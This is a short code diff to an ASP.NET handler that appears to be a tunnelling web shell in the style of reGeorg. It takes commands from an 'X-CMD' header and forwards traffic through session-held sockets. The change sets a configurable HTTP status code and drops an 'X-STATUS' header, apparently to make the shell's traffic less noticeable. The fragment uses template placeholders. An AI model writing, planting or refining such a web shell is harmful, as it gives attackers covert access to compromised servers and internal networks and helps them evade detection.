@@ -19,6 +19,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
     }
     public void ProcessRequest (HttpContext context) {
         try {
+            context.Response.StatusCode = HTTPCODE;
             String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
             String de = "BASE64 CHARSLIST";
             String cmd = context.Request.Headers.Get("X-CMD");
@@ -49,7 +50,6 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                     } catch (Exception ex) {
                     }
                     context.Session.Remove(mark);
-                    context.Response.AddHeader("X-STATUS", "OK");
                 } else if (cmd == "FORWARD") {
                     Socket s = (Socket)context.Session[mark];
                     try {
